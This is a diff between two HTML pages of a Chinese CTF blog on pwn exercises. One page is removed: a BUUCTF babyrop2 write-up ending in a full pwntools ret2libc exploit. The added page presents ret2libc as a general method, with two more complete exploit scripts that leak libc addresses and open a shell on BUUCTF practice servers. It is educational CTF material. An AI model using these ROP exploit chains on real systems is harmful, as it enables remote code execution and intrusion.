@@ -19,26 +19,20 @@
   <meta name="author" content="">
   <meta name="keywords" content="">
   
-    <meta name="description" content="题目简介BUUCTF原题，链接在这：BUUCTF原题：[HarekazeCTF2019]baby_rop2">
+    <meta name="description" content="简介在面对部分题目时，ret2libc可以作为通用解法，这类题目多为一些简单的后门函数、shellcode。">
 <meta property="og:type" content="article">
-<meta property="og:title" content="BUUCTF-HarekazeCTF2019-babyrop2">
-<meta property="og:url" content="http://0x4a-210.github.io/2025/07/27/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/ROP/ret2libc/BUUCTF-HarekazeCTF2019-babyrop2/index.html">
+<meta property="og:title" content="部分题目的通解：ret2libc">
+<meta property="og:url" content="http://0x4a-210.github.io/2025/07/27/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%E5%85%B6%E4%BB%96%E6%8A%80%E5%B7%A7%E7%B1%BB/%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AE%E7%9A%84%E9%80%9A%E8%A7%A3%EF%BC%9Aret2libc/index.html">
 <meta property="og:site_name" content="0x4A">
-<meta property="og:description" content="题目简介BUUCTF原题，链接在这：BUUCTF原题：[HarekazeCTF2019]baby_rop2">
+<meta property="og:description" content="简介在面对部分题目时，ret2libc可以作为通用解法，这类题目多为一些简单的后门函数、shellcode。">
 <meta property="og:locale" content="en_US">
-<meta property="og:image" content="http://0x4a-210.github.io/photos/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/ROP/ret2libc/BUUCTF-HarekazeCTF2019-babyrop2/IDA-main.png">
-<meta property="og:image" content="http://0x4a-210.github.io/photos/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/ROP/ret2libc/BUUCTF-HarekazeCTF2019-babyrop2/checksec.png">
-<meta property="og:image" content="http://0x4a-210.github.io/photos/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/ROP/ret2libc/BUUCTF-HarekazeCTF2019-babyrop2/format-string.png">
-<meta property="og:image" content="http://0x4a-210.github.io/photos/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/ROP/ret2libc/BUUCTF-HarekazeCTF2019-babyrop2/rodata.png">
-<meta property="og:image" content="http://0x4a-210.github.io/photos/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/ROP/ret2libc/BUUCTF-HarekazeCTF2019-babyrop2/gadgets.png">
-<meta property="article:published_time" content="2025-07-27T04:20:18.000Z">
-<meta property="article:modified_time" content="2025-07-27T04:43:29.361Z">
+<meta property="article:published_time" content="2025-07-27T04:47:52.000Z">
+<meta property="article:modified_time" content="2025-07-27T05:10:53.561Z">
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:image" content="http://0x4a-210.github.io/photos/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/ROP/ret2libc/BUUCTF-HarekazeCTF2019-babyrop2/IDA-main.png">
   
   
   
-  <title>BUUCTF-HarekazeCTF2019-babyrop2 - 0x4A</title>
+  <title>部分题目的通解：ret2libc - 0x4A</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -192,7 +186,7 @@
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle" data-typed-text="BUUCTF-HarekazeCTF2019-babyrop2"></span>
+            <span id="subtitle" data-typed-text="部分题目的通解：ret2libc"></span>
           
         </div>
 
@@ -203,7 +197,7 @@
     
       <span class="post-meta">
         <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-        <time datetime="2025-07-27 12:20" pubdate>
+        <time datetime="2025-07-27 12:47" pubdate>
           July 27, 2025 pm
         </time>
       </span>
@@ -215,7 +209,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          601 words
+          551 words
         
       </span>
     
@@ -226,7 +220,7 @@
         
         
         
-          6 mins
+          5 mins
         
       </span>
     
@@ -263,16 +257,18 @@
       <div class="container nopadding-x-md" id="board-ctn">
         <div id="board">
           <article class="post-content mx-auto">
-            <h1 id="seo-header">BUUCTF-HarekazeCTF2019-babyrop2</h1>
+            <h1 id="seo-header">部分题目的通解：ret2libc</h1>
             
             
               <div class="markdown-body">
                 
-                <h1 id="题目简介"><a href="#题目简介" class="headerlink" title="题目简介"></a>题目简介</h1><p>BUUCTF原题，链接在这：<a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#[HarekazeCTF2019]baby_rop2">BUUCTF原题：[HarekazeCTF2019]baby_rop2</a></p>
+                <h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>在面对部分题目时，ret2libc可以作为通用解法，这类题目多为一些简单的后门函数、shellcode。<br></p>
 <span id="more"></span>
-<h1 id="漏洞点分析"><a href="#漏洞点分析" class="headerlink" title="漏洞点分析"></a>漏洞点分析</h1><p>首先还是拖进IDA里分析：<br><br><img src="/../../../../photos/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/ROP/ret2libc/BUUCTF-HarekazeCTF2019-babyrop2/IDA-main.png" srcset="/img/loading.gif" lazyload><br>可以看到溢出点发生在main函数，并且从左侧的函数表来看没有明显的后门函数<br><br>接下来用checksec查看一下保护：<br><br><img src="/../../../../photos/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/ROP/ret2libc/BUUCTF-HarekazeCTF2019-babyrop2/checksec.png" srcset="/img/loading.gif" lazyload><br>可以看到只开启了NX保护，再联系到题目给了libc.so.6的附件，可以分析出这道题需要ret2libc<br></p>
-<h1 id="漏洞点利用"><a href="#漏洞点利用" class="headerlink" title="漏洞点利用"></a>漏洞点利用</h1><p>首先通过IDA看出偏移量offset&#x3D;0x20+0x8&#x3D;0x28<br><br>接下来考虑如何泄露libc基地址<br><br>注意观察程序中没有调用puts函数，但有一个printf函数，所以只能通过printf来输出libc的基地址<br><br>接下来希望能找到程序本身存在的格式化字符串，在IDA中使用shift+F12，可以看到在程序的只读数据段（.rodata）存在%s格式字符串，如图：<br><br><img src="/../../../../photos/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/ROP/ret2libc/BUUCTF-HarekazeCTF2019-babyrop2/format-string.png" srcset="/img/loading.gif" lazyload><br>然后鼠标双击这个字符串，可以找到格式化字符串的实际地址，如图：<br><br><img src="/../../../../photos/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/ROP/ret2libc/BUUCTF-HarekazeCTF2019-babyrop2/rodata.png" srcset="/img/loading.gif" lazyload><br>printf函数有两个参数，因此要寻找pop rdi、pop rsi和ret指令碎片：<br><br><img src="/../../../../photos/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/ROP/ret2libc/BUUCTF-HarekazeCTF2019-babyrop2/gadgets.png" srcset="/img/loading.gif" lazyload><br>如上图所示，最终找到可用的pop rdi、pop rsi和ret指令的碎片分别在0x400733、0x400731和0x4004d1的位置<br><br>注意，这个程序里面没有完美的pop rsi ; ret序列，只能用0x400731处的pop rsi ; pop r15 ; ret序列凑活一下，到时候多填充个数给r15即可<br><br>最后，用于泄露地址的目标函数还是选择__libc_start_main<br><br>综上，最终的利用脚本如下：<br></p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>offset=<span class="hljs-number">0x28</span><br>pop_rdiAddr=<span class="hljs-number">0x400733</span><br>pop_rsiAddr=<span class="hljs-number">0x400731</span><br>retAlignPadding=<span class="hljs-number">0x4004d1</span><br>targetELF=<span class="hljs-string">&quot;./BUUCTF39&quot;</span><br>targetLibc=<span class="hljs-string">&quot;./libc.so.6&quot;</span><br><br>context(os=<span class="hljs-string">&quot;linux&quot;</span>,arch=<span class="hljs-string">&quot;amd64&quot;</span>,log_level=<span class="hljs-string">&quot;debug&quot;</span>)<br>ioTube=process(targetELF)<br><span class="hljs-comment">#ioTube=gdb.debug(targetELF,&quot;b *main+149&quot;)</span><br><span class="hljs-comment">#ioTube=remote(&quot;node5.buuoj.cn&quot;,27211)</span><br><br>elf=ELF(targetELF)<br>libc=ELF(targetLibc)<br><br>pltAddr=elf.plt[<span class="hljs-string">&quot;printf&quot;</span>]<br>leakFuncName=<span class="hljs-string">&quot;__libc_start_main&quot;</span><br>gotAddr=elf.got[leakFuncName]<br>startAddr=elf.symbols[<span class="hljs-string">&quot;_start&quot;</span>]<br>formatStr=<span class="hljs-number">0x400770</span><br><br>ioTube.recvuntil(<span class="hljs-string">&quot;What&#x27;s your name? &quot;</span>)<br>payload1=<span class="hljs-string">b&#x27;a&#x27;</span>*offset+p64(pop_rdiAddr)+p64(formatStr)+p64(pop_rsiAddr)+p64(gotAddr)+p64(<span class="hljs-number">0</span>)+p64(pltAddr)+p64(startAddr)+p64(retAlignPadding)<br>ioTube.sendline(payload1)<br>response=ioTube.recvuntil(<span class="hljs-string">&quot;!\nWha&quot;</span>)<br><span class="hljs-comment">#print(&quot;响应=&#123;&#125;\n&quot;.format(response))</span><br>realAddr=u64(response[-<span class="hljs-number">11</span>:-<span class="hljs-number">5</span>].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br><span class="hljs-comment">#print(&quot;测试一下泄露的地址长啥样：&#123;&#125;\n&quot;.format(hex(realAddr)))</span><br>libcBase=realAddr-libc.symbols[leakFuncName]<br><span class="hljs-comment">#print(&quot;真实地址=&#123;&#125;，libc基地址=&#123;&#125;\n&quot;.format(hex(realAddr),hex(libcBase)))</span><br><br>sysAddr=libcBase+libc.symbols[<span class="hljs-string">&quot;system&quot;</span>]<br>binshAddr=libcBase+<span class="hljs-built_in">next</span>(libc.search(<span class="hljs-string">&quot;/bin/sh&quot;</span>))<br>payload2=<span class="hljs-string">b&#x27;1&#x27;</span>*offset+p64(pop_rdiAddr)+p64(binshAddr)+p64(sysAddr)+p64(retAlignPadding)<br>ioTube.recvuntil(<span class="hljs-string">&quot;your name? &quot;</span>)<br>ioTube.sendline(payload2)<br><span class="hljs-comment">#ioTube.recvall(timeout=3)</span><br><span class="hljs-comment">#ioTube.recv()</span><br>ioTube.interactive()<br></code></pre></td></tr></table></figure>
+<p>这些题目大多具有共同的特点：<br><br>1 思路简单，代码量很少，容易发现溢出点，容易分析<br><br>2 但真正想要实现ret2shellcode或者后门函数，需要一些技巧，难以第一时间想到<br><br>3 最好是没有开启PIE和canary的程序<br><br>此时，在发现溢出点后，即可直接考虑ret2libc拿到shell，不用再继续进行复杂的分析和技巧考虑<br></p>
+<h1 id="例1：BUUCTF-picoctf-2018-rop-chain"><a href="#例1：BUUCTF-picoctf-2018-rop-chain" class="headerlink" title="例1：BUUCTF-picoctf_2018_rop_chain"></a>例1：BUUCTF-picoctf_2018_rop_chain</h1><p>具体分析见：<a href="https://0x4a-210.github.io/2025/07/26/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/ROP/ret2text/BUUCTF-picoctf-2018-rop-chain/">BUUCTF题解：picoctf_2018_rop_chain</a><br>现在提供一个ret2libc的解法：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>context(os=<span class="hljs-string">&quot;linux&quot;</span>,arch=<span class="hljs-string">&quot;x86&quot;</span>,log_level=<span class="hljs-string">&quot;debug&quot;</span>)<br>targetELF=<span class="hljs-string">&quot;./pwn&quot;</span><br>elf=ELF(targetELF)<br><span class="hljs-comment"># ioTube=process(targetELF)</span><br><span class="hljs-comment">#ioTube=gdb.debug(targetELF,&quot;b *0x4006a4&quot;)</span><br>ioTube=remote(<span class="hljs-string">&quot;node5.buuoj.cn&quot;</span>,<span class="hljs-number">27661</span>)<br><br>offset=<span class="hljs-number">28</span><br>pltAddr=elf.plt[<span class="hljs-string">&quot;puts&quot;</span>]<br>leakFuncName=<span class="hljs-string">&quot;__libc_start_main&quot;</span><br>gotAddr=elf.got[leakFuncName]<br>startAddr=elf.symbols[<span class="hljs-string">&quot;_start&quot;</span>]<br><br>ioTube.recvuntil(<span class="hljs-string">&quot;Enter your input&gt; &quot;</span>)<br>payload1=<span class="hljs-string">b&#x27;a&#x27;</span>*offset+p32(pltAddr)+p32(startAddr)+p32(gotAddr)<br>ioTube.sendline(payload1)<br>realAddr=u32(ioTube.recv(<span class="hljs-number">4</span>).ljust(<span class="hljs-number">4</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;泄露真实地址=&#123;&#125;\n&quot;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">hex</span>(realAddr)))<br>libc=LibcSearcher(leakFuncName,realAddr)<br>libcBase=realAddr-libc.dump(leakFuncName)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;泄露得到真实地址=&#123;&#125;，libc基址=&#123;&#125;\n&quot;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">hex</span>(realAddr),<span class="hljs-built_in">hex</span>(libcBase)))<br>sysAddr=libcBase+libc.dump(<span class="hljs-string">&quot;system&quot;</span>)<br>binshAddr=libcBase+libc.dump(<span class="hljs-string">&quot;str_bin_sh&quot;</span>)<br><br>payload2=<span class="hljs-string">b&#x27;1&#x27;</span>*offset+p32(sysAddr)+p32(<span class="hljs-number">0</span>)+p32(binshAddr)<br>ioTube.recvuntil(<span class="hljs-string">&quot;input&gt; &quot;</span>)<br>ioTube.sendline(payload2)<br>ioTube.interactive()<br></code></pre></td></tr></table></figure>
+<h1 id="例2：BUUCTF-ciscn-2019-s-9"><a href="#例2：BUUCTF-ciscn-2019-s-9" class="headerlink" title="例2：BUUCTF-ciscn_2019_s_9"></a>例2：BUUCTF-ciscn_2019_s_9</h1><p>具体分析见：<a href="https://0x4a-210.github.io/2025/07/27/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/Shellcode/BUUCTF-ciscn-2019-s-9/">BUUCTF题解：ciscn_2019_s_9</a><br>这道题同样存在ret2libc的解法如下：<br></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>context(os=<span class="hljs-string">&quot;linux&quot;</span>,arch=<span class="hljs-string">&quot;x86&quot;</span>,log_level=<span class="hljs-string">&quot;debug&quot;</span>)<br>targetELF=<span class="hljs-string">&quot;./pwn&quot;</span><br>libcPath=<span class="hljs-string">&quot;/lib/i386-linux-gnu/libc.so.6&quot;</span><br>elf=ELF(targetELF)<br><span class="hljs-comment">#ioTube=process(targetELF)</span><br><span class="hljs-comment">#ioTube=gdb.debug(targetELF,&quot;b *0x4006a4&quot;)</span><br>ioTube=remote(<span class="hljs-string">&quot;node5.buuoj.cn&quot;</span>,<span class="hljs-number">29656</span>)<br><br>offset=<span class="hljs-number">0x24</span><br>retAlignPadding=<span class="hljs-number">0x8048342</span><br>pltAddr=elf.plt[<span class="hljs-string">&quot;puts&quot;</span>]<br>leakFuncName=<span class="hljs-string">&quot;puts&quot;</span><br>gotAddr=elf.got[leakFuncName]<br>startAddr=elf.symbols[<span class="hljs-string">&quot;_start&quot;</span>]<br><br>ioTube.recvuntil(<span class="hljs-string">&quot;&gt;\n&quot;</span>)<br>payload1=<span class="hljs-string">b&#x27;a&#x27;</span>*offset+p32(pltAddr)+p32(startAddr)+p32(gotAddr)<br>ioTube.sendline(payload1)<br>ioTube.recvuntil(<span class="hljs-string">&quot;bye~\n&quot;</span>)<br>realAddr=u32(ioTube.recv(<span class="hljs-number">4</span>).ljust(<span class="hljs-number">4</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>libc=LibcSearcher(leakFuncName,realAddr)<br>libcBase=realAddr-libc.dump(leakFuncName)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;泄露得到真实地址=&#123;&#125;，libc基址=&#123;&#125;\n&quot;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">hex</span>(realAddr),<span class="hljs-built_in">hex</span>(libcBase)))<br>sysAddr=libcBase+libc.dump(<span class="hljs-string">&quot;system&quot;</span>)<br>binshAddr=libcBase+libc.dump(<span class="hljs-string">&quot;str_bin_sh&quot;</span>)<br><br>payload2=<span class="hljs-string">b&#x27;1&#x27;</span>*offset+p32(sysAddr)+p32(<span class="hljs-number">0</span>)+p32(binshAddr)<br>ioTube.recvuntil(<span class="hljs-string">&quot;&gt;\n&quot;</span>)<br>ioTube.sendline(payload2)<br>ioTube.interactive()<br></code></pre></td></tr></table></figure>
                 
               </div>
             
@@ -295,15 +291,8 @@
   
     <span>></span>
     
-  <a href="/categories/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/ROP/" class="category-chain-item">ROP</a>
+  <a href="/categories/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%E5%85%B6%E4%BB%96%E6%8A%80%E5%B7%A7%E7%B1%BB/" class="category-chain-item">其他技巧类</a>
   
-  
-    <span>></span>
-    
-  <a href="/categories/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/ROP/ret2libc/" class="category-chain-item">ret2libc</a>
-  
-  
-
   
 
   
@@ -324,8 +313,8 @@
 
   <div class="license-box my-3">
     <div class="license-title">
-      <div>BUUCTF-HarekazeCTF2019-babyrop2</div>
-      <div>http://0x4a-210.github.io/2025/07/27/pwn刷题记录/ROP/ret2libc/BUUCTF-HarekazeCTF2019-babyrop2/</div>
+      <div>部分题目的通解：ret2libc</div>
+      <div>http://0x4a-210.github.io/2025/07/27/pwn刷题记录/其他技巧类/部分题目的通解：ret2libc/</div>
     </div>
     <div class="license-meta">
       
@@ -364,18 +353,12 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2025/07/27/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%E5%85%B6%E4%BB%96%E6%8A%80%E5%B7%A7%E7%B1%BB/%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AE%E7%9A%84%E9%80%9A%E8%A7%A3%EF%BC%9Aret2libc/" title="部分题目的通解：ret2libc">
-                        <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">部分题目的通解：ret2libc</span>
-                        <span class="visible-mobile">Previous</span>
-                      </a>
-                    
                   </article>
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2025/07/27/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/Shellcode/BUUCTF-ciscn-2019-s-9/" title="BUUCTF-ciscn_2019_s_9">
-                        <span class="hidden-mobile">BUUCTF-ciscn_2019_s_9</span>
+                      <a href="/2025/07/27/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/ROP/ret2libc/BUUCTF-HarekazeCTF2019-babyrop2/" title="BUUCTF-HarekazeCTF2019-babyrop2">
+                        <span class="hidden-mobile">BUUCTF-HarekazeCTF2019-babyrop2</span>
                         <span class="visible-mobile">Next</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
